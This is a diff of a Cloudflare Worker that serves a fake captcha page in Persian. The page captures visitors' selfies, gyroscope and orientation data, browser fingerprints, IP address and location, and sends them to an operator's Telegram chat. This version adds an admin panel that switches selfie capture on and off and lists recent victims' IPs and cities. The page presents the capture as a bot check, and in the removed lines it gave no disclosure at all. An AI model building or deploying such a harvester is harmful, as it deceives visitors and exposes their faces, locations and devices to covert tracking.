@@ -1,17 +1,18 @@
 // ============================================================
-//  Selfie Captcha Worker — v5 (Gyro + Battery + On/Off toggle)
+//  Selfie Captcha Worker — v6 (Admin Panel)
 // ============================================================
 //  Env vars:
 //    TELEGRAM_BOT_TOKEN   (required)
 //    TELEGRAM_CHAT_ID     (required)
+//    ADMIN_TOKEN          (required for admin panel + legacy /on /off)
+//    ADMIN_PASSWORD       (STRONGLY recommended — defaults to ADMIN_TOKEN)
+//    ADMIN_PATH           (optional — defaults to ADMIN_TOKEN)
 //    SESSION_SECRET       (optional)
-//    ADMIN_TOKEN          (optional, but STRONGLY recommended)
 //    MAX_UPLOAD_BYTES     (optional, default 5MB)
 //    RATE_LIMIT_PER_MIN   (optional, default 5)
 //
-//  KV Binding (optional but recommended for /on /off):
-//    SELFIE_STATE  →  KV Namespace
-//    (fallback: Cache API per-colo if missing)
+//  KV Binding:
+//    SELFIE_STATE  →  KV Namespace  (recommended)
 // ============================================================
 
 export default {
@@ -25,7 +26,7 @@ export default {
       }
       if (url.pathname === '/upload') {
         if (request.method !== 'POST') return methodNotAllowed(['POST']);
-        return await handleUpload(request, env);
+        return await handleUpload(request, env, ctx);
       }
       if (url.pathname === '/on' || url.pathname === '/off') {
         if (request.method !== 'POST') return methodNotAllowed(['POST']);
@@ -34,6 +35,17 @@ export default {
       if (url.pathname === '/state') {
         if (request.method !== 'GET') return methodNotAllowed(['GET']);
         return json({ state: await getSelfieState(env) });
+      }
+
+      // 🔽 Admin panel routing
+      const adminBase = getAdminBase(env);
+      if (
+        adminBase &&
+        (url.pathname === adminBase || url.pathname.startsWith(adminBase + '/'))
+      ) {
+        const sub =
+          url.pathname === adminBase ? '' : url.pathname.slice(adminBase.length + 1);
+        return await handleAdmin(request, env, sub, adminBase);
       }
 
       return new Response('Not Found', { status: 404 });
@@ -45,10 +57,26 @@ export default {
 };
 
 // ============================================================
-//  Selfie mode toggle
+//  Admin: env helpers
+// ============================================================
+function getAdminBase(env) {
+  const p = env.ADMIN_PATH || env.ADMIN_TOKEN;
+  if (!p) return null;
+  const clean = String(p).replace(/^\/+|\/+$/g, '');
+  return clean ? '/' + clean : null;
+}
+
+function getAdminPassword(env) {
+  return env.ADMIN_PASSWORD || env.ADMIN_TOKEN || '';
+}
+
+// ============================================================
+//  Selfie mode state
 // ============================================================
 const STATE_KEY = 'selfie';
 const STATE_URL = 'https://selfie-state.local/state';
+const RECENT_LOG_KEY = 'recent_log';
+const RECENT_LOG_MAX = 20;
 
 async function getSelfieState(env) {
   if (env.SELFIE_STATE) {
@@ -72,12 +100,10 @@ async function getSelfieState(env) {
 
 async function setSelfieState(env, state) {
   const value = state === 'off' ? 'off' : 'on';
-
   if (env.SELFIE_STATE) {
     await env.SELFIE_STATE.put(STATE_KEY, value);
     return { ok: true, storage: 'kv', state: value };
   }
-
   const cache = caches.default;
   await cache.put(
     new Request(STATE_URL),
@@ -89,24 +115,171 @@ async function setSelfieState(env, state) {
     ok: true,
     storage: 'cache',
     state: value,
-    warning: 'SELFIE_STATE KV not bound — state is per-colo only',
+    warning: 'SELFIE_STATE KV not bound — per-colo only',
   };
 }
 
-async function handleToggle(request, env, action) {
-  if (env.ADMIN_TOKEN) {
-    const url = new URL(request.url);
-    const provided =
-      url.searchParams.get('token') ||
-      request.headers.get('X-Admin-Token') ||
-      '';
-    if (provided !== env.ADMIN_TOKEN) {
-      return json({ error: 'unauthorized' }, 401);
+async function getRecentLog(env) {
+  if (!env.SELFIE_STATE) return [];
+  try {
+    const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
+    if (!raw) return [];
+    const arr = JSON.parse(raw);
+    return Array.isArray(arr) ? arr : [];
+  } catch {
+    return [];
+  }
+}
+
+async function logSubmission(env, entry) {
+  if (!env.SELFIE_STATE) return;
+  try {
+    const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
+    let log = [];
+    if (raw) {
+      try {
+        log = JSON.parse(raw);
+      } catch {}
     }
+    if (!Array.isArray(log)) log = [];
+    log.unshift(entry);
+    if (log.length > RECENT_LOG_MAX) log.length = RECENT_LOG_MAX;
+    await env.SELFIE_STATE.put(RECENT_LOG_KEY, JSON.stringify(log));
+  } catch (e) {
+    console.error('log failed', e);
+  }
+}
+
+// ============================================================
+//  Admin session (HMAC)
+// ============================================================
+function adminSessionKey(env) {
+  // تغییر ADMIN_TOKEN یا ADMIN_PASSWORD → همهٔ سشن‌ها باطل می‌شن
+  return `admin|${env.ADMIN_TOKEN || ''}|${env.ADMIN_PASSWORD || ''}`;
+}
+
+async function issueAdminSession(env, ttlMs = 12 * 3600_000) {
+  const ts = String(Date.now());
+  const payload = btoa(ts);
+  const sig = await hmac(payload, adminSessionKey(env));
+  return `${payload}.${sig}`;
+}
+
+async function verifyAdminSession(token, env, maxAgeMs = 12 * 3600_000) {
+  if (!token || !env.ADMIN_TOKEN) return false;
+  try {
+    const [payload, sig] = String(token).split('.');
+    if (!payload || !sig) return false;
+    const expected = await hmac(payload, adminSessionKey(env));
+    if (expected.length !== sig.length) return false;
+    let diff = 0;
+    for (let i = 0; i < expected.length; i++) {
+      diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
+    }
+    if (diff !== 0) return false;
+    const ts = Number(atob(payload));
+    return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
+  } catch {
+    return false;
+  }
+}
+
+const timingSafeEqual = (a, b) => {
+  const A = String(a ?? '');
+  const B = String(b ?? '');
+  if (A.length !== B.length) return false;
+  let diff = 0;
+  for (let i = 0; i < A.length; i++) diff |= A.charCodeAt(i) ^ B.charCodeAt(i);
+  return diff === 0;
+};
+
+// ============================================================
+//  Legacy /on /off (kept for scripting)
+// ============================================================
+async function handleToggle(request, env, action) {
+  if (!env.ADMIN_TOKEN) return json({ error: 'admin_disabled' }, 403);
+  const url = new URL(request.url);
+  const provided =
+    url.searchParams.get('token') || request.headers.get('X-Admin-Token') || '';
+  if (!timingSafeEqual(provided, env.ADMIN_TOKEN)) {
+    return json({ error: 'unauthorized' }, 401);
   }
   const result = await setSelfieState(env, action);
-  console.log(`selfie mode → ${action}`, result);
   return json(result);
+}
+
+// ============================================================
+//  Admin handler
+// ============================================================
+async function handleAdmin(request, env, sub, adminBase) {
+  const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
+  const url = new URL(request.url);
+  const nonce = crypto.randomUUID().replace(/-/g, '');
+  const cookieHeader = request.headers.get('Cookie') || '';
+  const sessionToken = parseCookie(cookieHeader, 'admin_sess');
+  const authed = await verifyAdminSession(sessionToken, env);
+
+  // GET {admin}
+  if (request.method === 'GET' && sub === '') {
+    if (authed) {
+      const state = await getSelfieState(env);
+      const log = await getRecentLog(env);
+      return adminResponse(
+        renderAdminDashboard(nonce, adminBase, state, env, request.cf || {}, log, url.searchParams),
+        nonce
+      );
+    }
+    return adminResponse(
+      renderAdminLogin(nonce, adminBase, url.searchParams),
+      nonce
+    );
+  }
+
+  // POST {admin}/login
+  if (request.method === 'POST' && sub === 'login') {
+    const rl = await rateLimit('adminlogin:' + ip, 5, 60);
+    if (!rl.allowed) return redirect(adminBase + '?err=rate');
+
+    let password = '';
+    try {
+      const form = await request.formData();
+      password = String(form.get('password') || '');
+    } catch {}
+
+    const expected = getAdminPassword(env);
+    if (!expected || !timingSafeEqual(password, expected)) {
+      await sleep(300);
+      return redirect(adminBase + '?err=invalid');
+    }
+    const token = await issueAdminSession(env);
+    return redirect(adminBase + '?ok=login', 303, {
+      'Set-Cookie': `admin_sess=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=43200; Secure`,
+    });
+  }
+
+  // POST {admin}/logout
+  if (request.method === 'POST' && sub === 'logout') {
+    return redirect(adminBase, 303, {
+      'Set-Cookie': `admin_sess=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0; Secure`,
+    });
+  }
+
+  // POST {admin}/toggle
+  if (request.method === 'POST' && sub === 'toggle') {
+    if (!authed) return redirect(adminBase);
+    let desired = '';
+    try {
+      const form = await request.formData();
+      desired = String(form.get('state') || '');
+    } catch {}
+    if (desired !== 'on' && desired !== 'off') {
+      return redirect(adminBase + '?err=state');
+    }
+    await setSelfieState(env, desired);
+    return redirect(adminBase + '?ok=toggled&state=' + desired, 303);
+  }
+
+  return new Response('Not Found', { status: 404 });
 }
 
 // ============================================================
@@ -150,7 +323,7 @@ async function handlePage(request, env) {
 // ============================================================
 //  POST /upload
 // ============================================================
-async function handleUpload(request, env) {
+async function handleUpload(request, env, ctx) {
   const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
   const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
 
@@ -253,6 +426,21 @@ async function handleUpload(request, env) {
   );
   results.push({ step: 'raw_json', ok: !!docRes.ok });
 
+  // 🔽 log for admin panel
+  if (ctx && ctx.waitUntil) {
+    ctx.waitUntil(
+      logSubmission(env, {
+        ts: Date.now(),
+        sessionId,
+        ip,
+        country: cf.country || null,
+        city: cf.city || null,
+        selfieMode,
+        ua: String(request.headers.get('User-Agent') || '').slice(0, 80),
+      })
+    );
+  }
+
   if (!results.some((r) => r.ok)) {
     return json({ error: 'telegram_failed', results }, 502);
   }
@@ -298,7 +486,11 @@ class TelegramClient {
   }
   async _call(method, body, headers = {}) {
     try {
-      const res = await fetch(`${this.base}/${method}`, { method: 'POST', headers, body });
+      const res = await fetch(`${this.base}/${method}`, {
+        method: 'POST',
+        headers,
+        body,
+      });
       const data = await res.json();
       if (!data.ok) console.error(`telegram ${method}`, data);
       return data;
@@ -313,13 +505,7 @@ class TelegramClient {
 //  Report builder
 // ============================================================
 function buildReport(sessionId, server, client, selfieMode) {
-  const esc = (v) =>
-    String(v ?? '—')
-      .replace(/&/g, '&amp;')
-      .replace(/</g, '&lt;')
-      .replace(/>/g, '&gt;')
-      .replace(/"/g, '&quot;');
-
+  const esc = escapeHtml;
   const cam = client.camera || {};
   const frame = client.capturedFrame || {};
   const orientation = client.orientation || {};
@@ -427,8 +613,15 @@ PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
 }
 
 // ============================================================
-//  Helpers for report formatting
+//  Helpers
 // ============================================================
+const escapeHtml = (v) =>
+  String(v ?? '—')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+
 const fmtNum = (n, digits = 1) =>
   typeof n === 'number' && isFinite(n) ? n.toFixed(digits) : '—';
 
@@ -441,9 +634,6 @@ const fmtSeconds = (s) => {
   return `${Math.floor(s)} ثانیه`;
 };
 
-// ============================================================
-//  Session token (HMAC-signed timestamp)
-// ============================================================
 async function issueToken(secret) {
   const ts = String(Date.now());
   const payload = btoa(ts);
@@ -482,9 +672,6 @@ async function hmac(data, secret) {
     .replace(/=+$/, '');
 }
 
-// ============================================================
-//  Rate limit (Cache API, per-colo)
-// ============================================================
 async function rateLimit(ip, limit, windowSec) {
   const cache = caches.default;
   const key = new Request(`https://ratelimit.local/${encodeURIComponent(ip)}`);
@@ -500,9 +687,6 @@ async function rateLimit(ip, limit, windowSec) {
   return { allowed: true, remaining: limit - count - 1 };
 }
 
-// ============================================================
-//  Utilities
-// ============================================================
 function parseCookie(header, name) {
   for (const part of header.split(';')) {
     const [k, ...rest] = part.trim().split('=');
@@ -531,17 +715,312 @@ const json = (obj, status = 200) =>
     headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
   });
 const methodNotAllowed = (allowed) =>
-  new Response('Method Not Allowed', { status: 405, headers: { Allow: allowed.join(', ') } });
+  new Response('Method Not Allowed', {
+    status: 405,
+    headers: { Allow: allowed.join(', ') },
+  });
+const redirect = (location, status = 302, extraHeaders = {}) => {
+  const headers = new Headers({ Location: location, 'Cache-Control': 'no-store' });
+  for (const [k, v] of Object.entries(extraHeaders)) headers.set(k, v);
+  return new Response(null, { status, headers });
+};
+
+function adminResponse(html, nonce, extraHeaders = {}) {
+  const headers = new Headers({
+    'Content-Type': 'text/html;charset=UTF-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
+    'X-Content-Type-Options': 'nosniff',
+    'X-Frame-Options': 'DENY',
+    'Referrer-Policy': 'no-referrer',
+    'Content-Security-Policy': [
+      "default-src 'none'",
+      `script-src 'nonce-${nonce}'`,
+      `style-src 'nonce-${nonce}'`,
+      "connect-src 'self'",
+      "img-src 'self' data:",
+      "base-uri 'none'",
+      "form-action 'self'",
+      "frame-ancestors 'none'",
+    ].join('; '),
+  });
+  for (const [k, v] of Object.entries(extraHeaders)) headers.set(k, v);
+  return new Response(html, { headers });
+}
 
 // ============================================================
-//  Frontend
+//  Admin: shared CSS
+// ============================================================
+const ADMIN_CSS = `
+  :root {
+    --accent:#4a90e2; --ok:#22a06b; --ok-bg:#e8f7ef;
+    --err:#d93636; --err-bg:#fdeaea;
+    --warn:#e07c2d; --warn-bg:#fdf3e8;
+    --muted:#6b7280; --border:#dcdfe4; --bg:#f5f6f8;
+    --text:#1f2328;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; min-height: 100%; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                 "Helvetica Neue", Arial, sans-serif;
+    background: var(--bg); color: var(--text);
+    padding: 16px;
+    display: flex; align-items: flex-start; justify-content: center;
+  }
+  .wrap { width: 100%; max-width: 640px; }
+  .card {
+    background:#fff; border:1px solid var(--border); border-radius:14px;
+    box-shadow: 0 6px 24px rgba(15,23,42,.06);
+    padding: 20px;
+  }
+  h1 { font-size:18px; margin:0; }
+  h2 { font-size:15px; margin: 0 0 12px; }
+  .subtitle { color: var(--muted); font-size:13px; margin: 4px 0 18px; }
+  .alert {
+    padding: 10px 12px; border-radius: 8px; font-size: 13px;
+    margin-bottom: 14px;
+  }
+  .alert.err { background: var(--err-bg); color: var(--err); }
+  .alert.ok  { background: var(--ok-bg);  color: var(--ok); }
+  input[type=password] {
+    width: 100%; padding: 12px 14px; font-size: 15px;
+    border: 1px solid var(--border); border-radius: 10px;
+    background: #fff; color: var(--text); outline: none;
+    transition: border-color .15s;
+  }
+  input[type=password]:focus { border-color: var(--accent); }
+  .btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    padding: 11px 16px; font-size: 14px; font-weight: 500;
+    border: 1px solid var(--border); border-radius: 10px;
+    background:#fff; color: var(--text); cursor:pointer;
+    text-decoration:none; transition: all .15s;
+    font-family: inherit;
+  }
+  .btn:hover { background: #f3f4f6; }
+  .btn-primary { background: var(--accent); border-color: var(--accent); color:#fff; }
+  .btn-primary:hover { filter: brightness(1.05); }
+  .btn-danger { background: var(--err); border-color: var(--err); color:#fff; }
+  .btn-danger:hover { filter: brightness(1.05); }
+  .btn-success { background: var(--ok); border-color: var(--ok); color:#fff; }
+  .btn-success:hover { filter: brightness(1.05); }
+  .btn-block { width: 100%; }
+  .login-icon {
+    font-size: 36px; text-align:center; margin-bottom: 8px;
+  }
+  .login-card h1 { text-align: center; }
+  .login-card .subtitle { text-align: center; }
+  .row-between {
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; margin-bottom: 16px;
+  }
+  .status-card {
+    text-align: center; padding: 22px 16px;
+    border-radius: 14px; border: 1px solid var(--border);
+    margin-bottom: 16px; transition: all .2s;
+  }
+  .status-card.on  { background: var(--ok-bg);  border-color: #b7e6cd; }
+  .status-card.off { background: var(--err-bg); border-color: #f3c2c2; }
+  .status-badge {
+    font-size: 22px; font-weight: 700; margin-bottom: 6px;
+    letter-spacing: .5px;
+  }
+  .status-card.on .status-badge  { color: var(--ok); }
+  .status-card.off .status-badge { color: var(--err); }
+  .status-hint { font-size: 12px; color: var(--muted); margin-bottom: 16px; }
+  .info-grid {
+    display: grid; grid-template-columns: repeat(3, 1fr);
+    gap: 10px; margin-bottom: 16px;
+  }
+  .info-item {
+    background: #fafbfc; border: 1px solid var(--border);
+    border-radius: 10px; padding: 10px 12px;
+  }
+  .info-label { font-size: 11px; color: var(--muted); display:block; margin-bottom: 3px; }
+  .info-value { font-size: 13px; font-weight: 500; }
+  code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
+  .recent h2 { margin-top: 8px; }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  th, td { padding: 8px 6px; text-align: right; border-bottom: 1px solid var(--border); }
+  th { color: var(--muted); font-weight: 500; background: #fafbfc; }
+  tr:last-child td { border-bottom: none; }
+  .empty { text-align: center; color: var(--muted); padding: 16px !important; }
+  .mt { margin-top: 16px; }
+`;
+
+// ============================================================
+//  Admin: Login page
+// ============================================================
+function renderAdminLogin(nonce, adminBase, params) {
+  const err = params.get('err');
+  const errMsg =
+    err === 'rate'
+      ? '⛔️ تعداد تلاش بیش از حد مجاز. یک دقیقه صبر کنید.'
+      : err === 'invalid'
+        ? '⛔️ رمز عبور اشتباه است.'
+        : null;
+
+  return `<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>ورود به پنل</title>
+<style nonce="${nonce}">${ADMIN_CSS}</style>
+</head>
+<body>
+  <div class="wrap" style="max-width:380px">
+    <form class="card login-card" method="POST" action="${adminBase}/login">
+      <div class="login-icon">🔐</div>
+      <h1>پنل مدیریت</h1>
+      <p class="subtitle">برای ادامه رمز عبور را وارد کنید</p>
+      ${errMsg ? `<div class="alert err">${errMsg}</div>` : ''}
+      <input type="password" name="password" placeholder="رمز عبور"
+             required autofocus autocomplete="current-password">
+      <button type="submit" class="btn btn-primary btn-block mt">ورود</button>
+    </form>
+  </div>
+</body>
+</html>`;
+}
+
+// ============================================================
+//  Admin: Dashboard
+// ============================================================
+function renderAdminDashboard(nonce, adminBase, state, env, cf, log, params) {
+  const isOn = state === 'on';
+  const storage = env.SELFIE_STATE ? 'KV' : 'Cache (per-colo)';
+  const now = new Date();
+  const timeStr = now.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+
+  const okP = params.get('ok');
+  const errP = params.get('err');
+  let toast = '';
+  if (okP === 'login') toast = `<div class="alert ok">✅ ورود موفق.</div>`;
+  else if (okP === 'toggled') {
+    const s = params.get('state');
+    toast = `<div class="alert ok">✅ وضعیت به «${
+      s === 'on' ? 'روشن' : 'خاموش'
+    }» تغییر کرد.</div>`;
+  } else if (errP === 'state') toast = `<div class="alert err">❌ وضعیت نامعتبر.</div>`;
+
+  const rows = (log || []).length
+    ? log
+        .map(
+          (e) => `
+        <tr>
+          <td><code>${new Date(e.ts || 0).toISOString().slice(11, 19)}</code></td>
+          <td><code>${escapeHtml(e.ip || '—')}</code></td>
+          <td>${escapeHtml(e.country || '—')}</td>
+          <td>${escapeHtml(e.city || '—')}</td>
+          <td>${e.selfieMode === 'on' ? '🟢' : '🔴'}</td>
+        </tr>`
+        )
+        .join('')
+    : '<tr><td colspan="5" class="empty">هیچ ارسالی ثبت نشده</td></tr>';
+
+  return `<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>پنل مدیریت</title>
+<style nonce="${nonce}">${ADMIN_CSS}</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="row-between">
+        <div>
+          <h1>🔐 پنل مدیریت</h1>
+          <p class="subtitle" style="margin:4px 0 0">${escapeHtml(
+            new URL(adminBase, 'https://x').hostname || adminBase
+          )}</p>
+        </div>
+        <form method="POST" action="${adminBase}/logout">
+          <button type="submit" class="btn">خروج</button>
+        </form>
+      </div>
+
+      ${toast}
+
+      <div class="status-card ${isOn ? 'on' : 'off'}">
+        <div class="status-badge">${isOn ? '🟢 روشن' : '🔴 خاموش'}</div>
+        <div class="status-hint">
+          ${
+            isOn
+              ? 'از کاربر دوربین درخواست می‌شود و سلفی ارسال می‌گردد'
+              : 'دوربین درخواست نمی‌شود — فقط داده‌های دیگر ارسال می‌گردد'
+          }
+        </div>
+        <form method="POST" action="${adminBase}/toggle" data-confirm="آیا مطمئنید؟">
+          <input type="hidden" name="state" value="${isOn ? 'off' : 'on'}">
+          <button type="submit" class="btn btn-block ${
+            isOn ? 'btn-danger' : 'btn-success'
+          }">
+            ${isOn ? '🔴 خاموش کردن سلفی' : '🟢 روشن کردن سلفی'}
+          </button>
+        </form>
+      </div>
+
+      <div class="info-grid">
+        <div class="info-item">
+          <span class="info-label">ذخیره‌سازی</span>
+          <span class="info-value">${escapeHtml(storage)}</span>
+        </div>
+        <div class="info-item">
+          <span class="info-label">Colo</span>
+          <span class="info-value">${escapeHtml(cf.colo || '—')}</span>
+        </div>
+        <div class="info-item">
+          <span class="info-label">زمان سرور</span>
+          <span class="info-value" style="font-size:11px">${escapeHtml(timeStr)}</span>
+        </div>
+      </div>
+
+      <section class="recent">
+        <div class="row-between">
+          <h2>📋 آخرین ارسال‌ها</h2>
+          <a class="btn" href="${adminBase}" style="padding:6px 10px;font-size:12px">🔄 بروزرسانی</a>
+        </div>
+        <table>
+          <thead>
+            <tr>
+              <th>زمان (UTC)</th>
+              <th>IP</th>
+              <th>کشور</th>
+              <th>شهر</th>
+              <th>سلفی</th>
+            </tr>
+          </thead>
+          <tbody>${rows}</tbody>
+        </table>
+      </section>
+    </div>
+  </div>
+
+<script nonce="${nonce}">
+  document.querySelectorAll('form[data-confirm]').forEach((f) => {
+    f.addEventListener('submit', (e) => {
+      if (!confirm(f.dataset.confirm)) e.preventDefault();
+    });
+  });
+</script>
+</body>
+</html>`;
+}
+
+// ============================================================
+//  Frontend (captcha page)
 // ============================================================
 function renderHTML(nonce, selfieState) {
   const selfieMode = selfieState === 'off' ? 'off' : 'on';
   const hintText =
     selfieMode === 'on'
-      ? 'تایید کنید ربات نیستید.'
-      : '';
+      ? 'با کلیک روی این کادر، یک تصویر سلفی و اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.'
+      : 'با کلیک روی این کادر، اطلاعات فنی مرورگر شما برای بررسی ارسال می‌شود.';
 
   return `<!DOCTYPE html>
 <html lang="fa" dir="rtl">
@@ -634,12 +1113,12 @@ function renderHTML(nonce, selfieState) {
   let busy = false;
 
   const CAM_ERRORS = {
-    NotAllowedError: 'دسترسی های خواسته شده رد شد، مجاز کنید.',
+    NotAllowedError: 'دسترسی به دوربین رد شد. اجازه دهید و دوباره تلاش کنید.',
     NotFoundError: 'دوربینی یافت نشد.',
     NotReadableError: 'دوربین در حال استفاده توسط برنامه دیگری است.',
     OverconstrainedError: 'دوربین با تنظیمات درخواستی سازگار نیست.',
     SecurityError: 'دسترسی به دوربین به دلایل امنیتی ممکن نیست (HTTPS الزامی است).',
-    AbortError: 'دسترسی لغو شد.',
+    AbortError: 'دسترسی به دوربین لغو شد.',
   };
 
   function setState(state, message) {
@@ -755,7 +1234,6 @@ function renderHTML(nonce, selfieState) {
       supported: typeof DeviceOrientationEvent !== 'undefined',
       samples: [],
     };
-
     try {
       if (screen.orientation) {
         result.screenOrientation = {
@@ -768,7 +1246,6 @@ function renderHTML(nonce, selfieState) {
     } catch (e) {
       result._screenOrientationError = String(e);
     }
-
     if (!result.supported) return result;
 
     const collected = [];
@@ -791,7 +1268,6 @@ function renderHTML(nonce, selfieState) {
       result.note = 'no_events_received';
       return result;
     }
-
     const avgOf = (key) => {
       const v = valid.map((s) => s[key]).filter((n) => typeof n === 'number');
       return v.length ? v.reduce((a, b) => a + b, 0) / v.length : null;
@@ -827,7 +1303,6 @@ function renderHTML(nonce, selfieState) {
       if (t.indexOf('portrait') === 0) parts.push('صفحه عمودی');
       else if (t.indexOf('landscape') === 0) parts.push('صفحه افقی');
     }
-
     return parts.join(' • ') || 'صاف';
   }
 
